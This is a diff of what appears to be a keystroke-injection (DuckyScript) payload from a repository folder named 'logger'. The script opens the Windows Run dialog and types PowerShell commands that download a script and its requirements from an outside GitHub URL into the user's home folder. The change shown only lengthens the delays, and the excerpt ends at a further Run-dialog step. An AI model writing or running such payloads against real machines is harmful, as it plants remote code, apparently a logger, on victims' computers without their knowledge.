@@ -2,17 +2,17 @@ DEFINE #SCRIPTURL1 https://raw.githubusercontent.com/castrosp/payloads/refs/head
 DEFINE #SCRIPTURL2 https://raw.githubusercontent.com/castrosp/payloads/refs/heads/main/logger/requirements.txt
 
 GUI r
-DELAY 500
+DELAY 1000
 STRING powershell Invoke-WebRequest -Uri #SCRIPTURL2 -OutFile C:/Users/$env:UserName\requirements.txt
 ENTER
-DELAY 1000
+DELAY 5000
 STRING exit
 
 GUI r
-DELAY 500
+DELAY 1000
 STRING powershell Invoke-WebRequest -Uri #SCRIPTURL1 -OutFile C:/Users/$env:UserName\script.py
 ENTER
-DELAY 1000
+DELAY 5000
 STRING exit
 
 GUI r
